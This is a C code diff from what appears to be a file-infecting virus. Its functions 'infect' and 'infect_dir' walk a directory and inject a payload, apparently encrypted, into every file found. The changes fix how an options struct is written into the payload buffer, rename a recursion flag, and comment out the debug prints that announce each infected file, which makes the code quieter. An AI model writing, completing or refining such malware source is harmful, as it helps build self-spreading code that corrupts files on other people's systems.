@@ -61,8 +61,8 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt)
 	//modifying 2bit after
 	size_t *p = ((size_t *)(char*)(b + pos + DATA));
 	p[0] = max(old_entry,entry) - min(old_entry,entry);
-	struct s_opt *p_opt = (struct s_opt*)(((char *)b+8));
-	p_opt[0] = opt;
+	struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
+	*p_opt = opt;
 	//p[1] = entry - pos;
 	//printf("diff: %zx, size: %zx\n", entry - pos, n);
 	//p[2] = n;
@@ -154,8 +154,8 @@ int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, siz
 #define LIM 1024
 
 int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
-	print("infecting directory:");
-	println(dirname);
+	//print("infecting directory:");
+	//println(dirname);
 	struct linux_dirent *d;
 	char		*p;
 	char		tmp[LIM];
@@ -165,13 +165,13 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 	size_t x = 0;
 	while (x < size){
 		d = (struct linux_dirent*)(p + x);
-		if (opt.is_recur && d_isdir(d)){
-			print("     d:");println(tmp);
-			println("dir and can recur!");
+		if (opt.do_recur && d_isdir(d)){
+			//print("     d:");println(tmp);
+			//println("dir and can recur!");
 		}
 		else if (d_isfile(d)){
 			add_base((char *)tmp, dirname, d->d_name, LIM);
-			print("     f:");println(tmp);
+			//print("     f:");println(tmp);
 			infect(tmp, debug_name(tmp), b, bn, crypt_off, crypt_len, opt);
 		}
 		x += d->d_reclen;
